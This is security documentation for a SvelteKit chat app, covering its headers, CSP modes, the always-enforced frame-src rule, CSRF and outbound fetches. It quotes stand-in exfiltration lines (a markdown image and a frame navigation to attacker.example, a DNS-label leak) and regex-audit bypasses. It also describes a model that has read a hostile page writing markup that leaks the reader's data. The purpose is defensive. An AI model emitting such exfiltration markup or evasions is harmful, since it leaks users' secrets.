# Security Headers And Content Security Policy

Every response the app serves gets a baseline set of security headers, and every rendered page
additionally carries a Content Security Policy. The CSP ships **report-only by default** — it is
observed, not enforced, until an operator flips it — with one exception: the page policy's
`frame-src` is **enforced in every mode but `off`** (see [The frame rule is always
enforced](#the-frame-rule-is-always-enforced)).

- Header logic: [`src/lib/server/security-headers.ts`](../src/lib/server/security-headers.ts) (pure,
  table-driven) applied from [`src/hooks.server.ts`](../src/hooks.server.ts).
- CSP directives: the `csp` block in [`svelte.config.js`](../svelte.config.js).
- Env switch: `CSP_MODE` (see [configuration.md](./configuration.md)).
- The cross-site form check (CSRF) lives in SvelteKit and is configured by *not* configuring it:
  see [Cross-site form posts](#cross-site-form-posts-csrf).

## What is sent

| Header | Scope | Value |
|---|---|---|
| `X-Content-Type-Options` | every response | `nosniff` |
| `Referrer-Policy` | every response | `strict-origin-when-cross-origin` |
| `Strict-Transport-Security` | production **and** HTTPS only | `max-age=63072000; includeSubDomains` |
| `X-Frame-Options` | HTML documents outside `/api/` | `SAMEORIGIN` |
| `Permissions-Policy` | HTML documents outside `/api/` | camera, microphone, geolocation, payment, USB, sensors and friends all denied |
| `Cross-Origin-Opener-Policy` | HTML documents outside `/api/` | `same-origin` |
| `Content-Security-Policy[-Report-Only]` | rendered pages | see below; in the default mode both are sent, the enforcing one carrying `frame-src` alone |

### Why these values

**`X-Frame-Options: SAMEORIGIN`, not `DENY`.** The CSP's `frame-ancestors 'self'` is the directive
browsers actually honour; XFO is the fallback for anything old enough not to, and the two agree.

**`Cross-Origin-Opener-Policy: same-origin`, not `same-origin-allow-popups`.** Google and OneDrive
OAuth are full-page redirects, not popups. Every `window.open` in the app passes `noopener`, which
already severs the handle COOP would sever. The Nextcloud login-flow-v2 tab checks the return value
only for truthiness to detect a popup blocker, and a COOP-severed `window.open` still returns a stub
rather than `null`.

**No `Cross-Origin-Embedder-Policy`.** `require-corp` would break `/api/favicon` (which sets
`cross-origin-resource-policy: same-site`) and every remote image in chat markdown.

**HSTS is gated on both production and TLS.** adapter-node defaults `url.protocol` to `https` when
`PROTOCOL_HEADER` is unset — which it is — so the protocol is read from `x-forwarded-proto` when the
proxy sends one and falls back to `url.protocol` otherwise. Reading that header without a configured
trust anchor is safe here in both directions: forging it to `http` only withholds HSTS from
yourself, and forging it to `https` only adds a header browsers ignore on a plain-HTTP response.

**Nothing overwrites a header a route already set.** This matters most for the generated-file
previews (`/api/knowledge/[id]/preview`, `/api/chat/files/[id]/preview`), which ship a deliberately
much tighter policy from
[`file-serving-response-policy.ts`](../src/lib/server/services/file-serving-response-policy.ts):
`Referrer-Policy: no-referrer` and a `default-src 'none'` CSP. The preview runtime matches that CSP
string **exactly** to decide whether a generated HTML report may run scripts
(`allowsTrustedHtmlPreviewRuntime` in
`src/lib/components/document-workspace/preview-runtime/index.ts`), so touching it at all would
silently downgrade every report to the no-script renderer. Three independent guards keep that from
happening:

1. the document-only headers are scoped away from `/api/`;
2. no header is set if the route already set it; and
3. the `CSP_MODE` rewrite is applied **only** to a policy SvelteKit generated, identified by the
   `x-sveltekit-page: true` stamp SvelteKit puts on page responses in the same `Headers` literal
   that carries the policy. Guard 2 is not enough on its own here, because the rewrite's
   report-only branch has to *delete* `Content-Security-Policy` in order to re-send it under the
   report-only name — on a preview response that would both un-enforce the sandbox policy on
   model-generated HTML and leave the trust check with no header to match.

### Responses the hook never sees

Static files under `/_app/immutable/`, `/favicon.png` and the rest of `static/` are served by
adapter-node's own middleware, which runs *before* SvelteKit's `handle`. They carry their own
`Content-Type` and `Cache-Control` and none of the headers in the table above. That is the
pre-existing behaviour and is not a gap worth closing in the app: they are immutable, correctly
typed, same-origin assets. If it ever needs closing, Apache is the place.

## The CSP

SvelteKit builds and emits the policy itself, from the `csp` block in `svelte.config.js`, in
`mode: 'nonce'`. That is why it is configured there rather than hand-rolled: SvelteKit mints a
per-request nonce, attaches it to the hydration scripts it injects, and substitutes it into the
`%sveltekit.nonce%` placeholders on the two hand-written inline scripts in `src/app.html` (scroll
restoration and the no-flash theme bootstrap).

`hooks.server.ts` then decides what the browser actually receives, at runtime, from `CSP_MODE`. The
app is not configured through SvelteKit's own `reportOnly` option because that option refuses to
emit without a `report-to`/`report-uri` directive, and there is no report collector here — the
browser console on staging is the collector.

The policy, as emitted:

```
default-src 'self';
script-src 'self' 'nonce-<per request>';
style-src 'self' 'unsafe-inline'; style-src-attr 'unsafe-inline';
img-src 'self' data: blob:;
font-src 'self';
connect-src 'self' [+ the Sentry DSN origin when one is configured];
worker-src 'self' blob:; child-src 'self' blob:;
media-src 'self' data: blob:; manifest-src 'self'; frame-src 'self';
object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'
```

Why each of the loose ones is loose:

- **`style-src 'unsafe-inline'`** is unavoidable today. Shiki emits an inline `style` attribute on
  every highlighted token, and mermaid puts `<style>` elements inside the sanitized SVG that is
  `{@html}`-injected. Its presence is also what stops SvelteKit adding a style *nonce* — a nonce in
  `style-src` makes browsers ignore `'unsafe-inline'`, which would break both.
- **`img-src` has no `https:`.** A picture the browser fetches is a request to whatever address
  the markup names, made with no click, and model-written markup can carry the reader's data in that
  address (`![](https://attacker.example/?q=<secret>)`): a model that has just read a hostile page
  may write exactly that. So the page draws images from its own origin only, plus `data:` (inline
  SVG and preview URIs) and `blob:` (the image preview and the settings image pickers). Every image
  the UI draws is same-origin: avatars, campaign and model icons (`/api/campaign-assets/…`), the
  favicon proxy (`/api/favicon`), the Immich thumbnail proxy, map tiles, chat files. A grep of the
  components, the CSS and `src/app.html` for any other remote image found none; what is left is
  what the model writes into a reply, which reaches the page as one of the search tool's Brave
  thumbnails fetched by the server and served from `/api/image-search/thumbnail`, and otherwise as
  a plain link. Two consequences to know about when `CSP_MODE=enforce`: a generated HTML report
  opened in the in-app preview (a `srcdoc` frame, which inherits this policy) shows no remote
  pictures, only `data:` ones (the file you download is unaffected), and the markdown renderer
  must not emit a remote `<img>` (it shows a link instead).
- **`worker-src blob:`** for Sentry's replay compression worker. pdf.js and MapLibre workers are
  same-origin.
- **`connect-src`** is same-origin only: the browser never talks to a model provider, a tile server
  or a favicon host directly — those are all proxied through `/api/`. The Sentry DSN origin is
  appended at runtime in `hooks.server.ts`, so the DSN never has to be known at build time and
  rotating it is not a rebuild.

Map tiles (`/api/map-tiles`) and favicons (`/api/favicon`) need no entry of their own: the client
requests both from this origin.

### The frame rule is always enforced

A model-written App runs in a sandboxed frame of our own pages (`AppFrame.svelte`), and nothing it
does is checked line by line: the write-time audit is a regex, and `window["loc"+"ation"]` or
`const w = window; w.location = …` walk past it. What an App can do from there is send its own
frame to any address, and an address is all it takes to carry what the reader typed into it out of
the app: `location = "https://elsewhere.example/?" + secret`, a meta refresh, an anchor click. The
App's own CSP cannot stop that (`navigate-to`, the directive that would, shipped in no browser). The
one brake is the **embedding page's `frame-src`**, which answers for a navigation the framed
document starts itself. And at its default (`CSP_MODE=report-only`) a policy only observes.

So `frame-src` is the one directive that does not wait for the day the whole policy is flipped. In
report-only mode a page response carries both headers:

```
content-security-policy:             frame-src 'self'
content-security-policy-report-only: <the full policy, as above>
```

- The enforcing header is `frameSrcDirective(policy)` in `security-headers.ts`: the page policy's
  own `frame-src`, cut out of the string SvelteKit built, so `kit.csp.directives['frame-src']` in
  `svelte.config.js` stays the one place that says what a frame may load. A policy with no
  `frame-src` has no frame rule to enforce, and then no enforcing header is sent.
- `enforce` already enforces it (inside the whole policy). `off` sends no CSP at all, this rule
  included: it is the documented escape hatch and stays one.
- Only SvelteKit **pages** get it. The App's own response (`/api/artifacts/[id]/app`), the file
  previews and every other route that sets its own CSP are untouched, as before.
- `'self'` means a frame of these pages can only be pointed at this app, so an App that leaves for
  one of our own pages (`location = "/login"`) is still stopped by ruling 58's tripwire in
  `AppFrame.svelte`, not by the CSP. The `srcdoc` document previews are not affected (they are not
  loaded from a URL), and nothing else in the app frames a URL.
- Never widen it. `tests/integration/svelte-config-security.test.ts` fails if `frame-src` is
  anything but `['self']`.

**Measured** (headless Chromium 147, `tests/e2e/app-frame-navigation.spec.ts`: Apps seeded straight
into the database, past the write audit, each trying one way out to a stand-in host on `.invalid`
and counted by `page.route`). With no enforced `frame-src` (`CSP_MODE=off`, which is what
report-only amounts to for this purpose) eight ways out sent the request: `location = url`,
`window.location.href`, `window["loc"+"ation"]`, an aliased `window`, `location.assign`,
`location.replace`, a meta refresh and an anchor click. With it, none does. Four more were already
stopped by the App's own sandbox and CSP and stay so: a form submit (`form-action 'none'`),
`window.open` and `top.location` (no `allow-popups`, no `allow-top-navigation`), and a nested
iframe (`default-src 'none'`).

**Tried and not added**, because the measurement says they do nothing:

- *A Navigation API guard in the App bootstrap* (cancel cross-document `navigate` events). In a
  sandboxed, opaque-origin frame (an App's) the `navigate` event never fires, so the guard never
  runs; in an ordinary same-origin frame it works. It cannot be the brake.
- *`X-DNS-Prefetch-Control: off` on the App response.* No probe changed with it: not the
  navigations, and none of `<link rel=preconnect>`, `<link rel=dns-prefetch>` or an anchor was ever
  observed to open a connection or a resolver job in this Chromium, with or without the App's CSP.
  The App's `default-src 'none'` does stop `<link rel=prefetch>`, which is a request when the CSP is
  absent.

**Residual, documented and not fixed.** With the rule enforced, the navigation request is not sent,
but in a full Chromium the browser's own loading predictor starts a *preconnect* to the address of
a navigation before the frame-src check stops it (seen in the net log as an `is_preconnect` stream
job): a TCP connection, and for `https` a TLS handshake, to a host the App named, with no HTTP
request. What can leave that way is the host name and the port, so a few bytes can still go out in
a DNS label (`https://<encoded-secret>.attacker.example/`). This is the residual that
[`docs/plans/exfil-channels/design.md`](./plans/exfil-channels/design.md) lists as DNS lookups
started by `preconnect` inside an App; nothing in a header or in the App's response reaches it.

## Rolling out: report-only → enforce

`CSP_MODE` defaults to `report-only`, and anything it does not recognise also means `report-only`,
so a typo cannot put production onto an enforcing policy nobody has watched.

1. **Deploy to staging with the default.** Nothing is blocked except a frame being pointed at
   another origin (see above); every other violation is reported.
2. **Exercise the app with the browser console open.** Violations appear as
   `Content Security Policy ... would be blocked` (report-only wording; the exact phrasing varies by
   browser). Cover the surfaces most likely to trip: a chat message with a code block (Shiki), one
   with a ` ```mermaid ` fence, a message with remote images, a map route card, a PDF preview, a
   generated HTML/xlsx/docx file preview, the knowledge upload flow, the settings image pickers, and
   a connections OAuth round trip.
3. **Fix what it finds by widening a directive deliberately**, not by reaching for `'unsafe-inline'`
   on `script-src`.
4. **Flip staging to enforce** (`CSP_MODE=enforce` in `shared/.env`, restart) and repeat step 2. A
   violation that was only a console line is now a broken feature, so it is worth a second pass.
5. **Flip production**, and keep `CSP_MODE=report-only` in mind as the one-line rollback — it does
   not need a redeploy, only an `.env` edit and a restart.

`CSP_MODE=off` removes the header entirely, the frame rule included; it exists so a CSP problem can
never be the reason a deploy has to be rolled back. It also takes an App's frame back to being able
to leave the page, so it is a state to leave quickly, not one to run in.

### Does mermaid need `'unsafe-eval'`?

**No, and this is measured rather than assumed.** A scan of all 276 JavaScript files in
`node_modules/mermaid/dist` (mermaid 11.17.0, including the lazily-loaded per-diagram chunks) finds
zero occurrences of `new Function(` or a bare `eval(`:

```
node -e 'const fs=require("fs"),path=require("path");
function walk(d,o=[]){for(const e of fs.readdirSync(d,{withFileTypes:true})){const p=path.join(d,e.name);
e.isDirectory()?walk(p,o):/\.(js|mjs|cjs)$/.test(e.name)&&o.push(p)}return o}
let n=0;for(const f of walk("node_modules/mermaid/dist")){
const m=fs.readFileSync(f,"utf8").match(/new Function\(|[^.\w$]eval\(/g); if(m)n+=m.length}
console.log("matches:",n)'
# matches: 0
```

So `script-src` stays free of `'unsafe-eval'`. Re-run that scan after a mermaid upgrade; a version
that reintroduces a runtime compiler would show up as a `script-src` violation in report-only mode
before it could break anything.

## Verified output

Captured from a real `npm run build && node build` with `NODE_ENV=production` and
`x-forwarded-proto: https`, one boot per mode. Abbreviated to the headers this document owns.

| Route | `report-only` (default) | `enforce` | `off` |
|---|---|---|---|
| `/login` (page) | `content-security-policy-report-only` with the full policy incl. `'nonce-…'`, **and** `content-security-policy: frame-src 'self'` (nothing else enforced) | `content-security-policy` with the same full policy; no report-only header | neither CSP header |
| `/api/health` (JSON) | `nosniff`, `referrer-policy`, HSTS only — no CSP, no XFO, no COOP, no Permissions-Policy | same | same |
| `/api/**/preview` (endpoint) | its own `default-src 'none'` CSP, enforcing, untouched | untouched | untouched |
| `/_app/immutable/**` | no security headers (served before `handle`) | same | same |
| `/login` over `x-forwarded-proto: http` | as above **minus** `Strict-Transport-Security` | same | same |

The `/login` and `/api/health` rows were captured again for the frame rule (one boot per mode, the
real `Content-Security-Policy` values read off the wire); the preview and `/_app/` rows are not
touched by it and stay held by the hooks tests.

Every page response also carries `x-frame-options: SAMEORIGIN`, `cross-origin-opener-policy:
same-origin`, the `Permissions-Policy` list, `referrer-policy: strict-origin-when-cross-origin` and
`x-content-type-options: nosniff`. No `<meta http-equiv="content-security-policy">` is emitted
anywhere, because no route in this app is prerendered — SvelteKit only falls back to a meta tag when
prerendering, and a meta CSP could not be switched by `CSP_MODE` at runtime. If a route ever gains
`export const prerender = true`, this section stops being true for it.

## Cross-site form posts (CSRF)

SvelteKit refuses a `POST`, `PUT`, `PATCH` or `DELETE` whose body is a form type
(`application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`) when the request's
`Origin` header is missing or is not the server's own origin (`403 Cross-site POST form submissions
are forbidden`). That is the check that stops another site from sending a signed-in user's browser
to this app with a body, and it covers more than HTML forms: a cross-site `text/plain` POST needs
no CORS preflight, and a handler that calls `request.json()` parses it just the same.

- **It is on.** `svelte.config.js` has no `csrf` block. It used to say `trustedOrigins: ['*']`,
  which SvelteKit reads as "switch the check off" (it writes `csrf_check_origin: false` into the
  server's options). That was added for an internal OCR upload route that has since been deleted,
  and nothing posts a form to this app cross-origin: the OAuth callbacks are `GET`, and the
  connections, browser-push, file-production and drain endpoints read JSON.
  `tests/integration/svelte-config-security.test.ts` fails if a wildcard comes back, or any
  `trustedOrigins` entry that is not an exact `scheme://host`. A real cross-origin form sender, if
  one is ever added, is added there by its exact origin in the same change.
- **JSON is not a form type**, so a `fetch` with `Content-Type: application/json` is not touched by
  this check. The session cookie is `HttpOnly; SameSite=Lax`, which is what keeps the cookie off a
  cross-site POST in the first place; this check is the second wall behind it.
- **The server's own origin** is the `ORIGIN` environment variable when it is set, and otherwise
  what adapter-node builds from the request: the protocol from `PROTOCOL_HEADER` (default `https`)
  and the host from the `Host` header. Behind Apache with `ProxyPreserveHost On` and TLS that is
  already the address the browser used, so nothing needs configuring. When the browser's origin
  and the server's differ (a plain-`http` staging box, a proxy that rewrites `Host`, a non-default
  port in front), every upload, avatar and import fails with the 403 above and the cure is
  `ORIGIN=https://the.public.address` in `shared/.env`; see [configuration.md](./configuration.md).
  `vite dev` does not run the check.
- **A caller that is not a browser sends no `Origin`**, and must send its own: Playwright's request
  context (`page.request`) and scripts doing a raw upload. The e2e specs spread
  `sameOriginHeader()` from `tests/e2e/request-origin.ts` (the slot server's own `ORIGIN`) into any
  form-typed request, as the four that upload through `/api/knowledge/upload/raw` with a
  `text/plain` body do; `scripts/atlas-eval.ts` and `scripts/verify-live-extraction-types.ts` send
  their base URL's origin. A form-typed request made without one fails at once with the 403, and
  the production-build e2e run is where a missed caller shows up.

Verified on the production build: `text/plain` to `/api/knowledge/upload/raw` and to `/api/projects`
with no `Origin`, with a foreign `Origin`, and `application/x-www-form-urlencoded` with none, all
`403`; the same upload with the server's own `Origin`, `200`; `application/json` with no `Origin`,
`201`.

## What the server itself fetches

The headers above govern what a browser may do with our pages. The other half is what this
server will fetch on a stranger's say-so: a host a model wrote into a reply, a page a search
returned, an image address in a document. Those fetches go through
[`src/lib/server/outbound/`](../src/lib/server/outbound/), which judges the address a name
resolves to rather than the text of the host (a public name that resolves to `127.0.0.1`,
`https://[::ffff:7f00:1]/`, `[::]`, `100.64.0.0/10` and `*.internal` all passed the earlier text
checks), connects to the address it checked, follows no redirects, and caps the time and the body.
The favicon proxy and the PDF report image loader use it today. Anything new that fetches an address
nobody on the server's side chose must too: `createOutboundFetch` there, never `globalThis.fetch`.
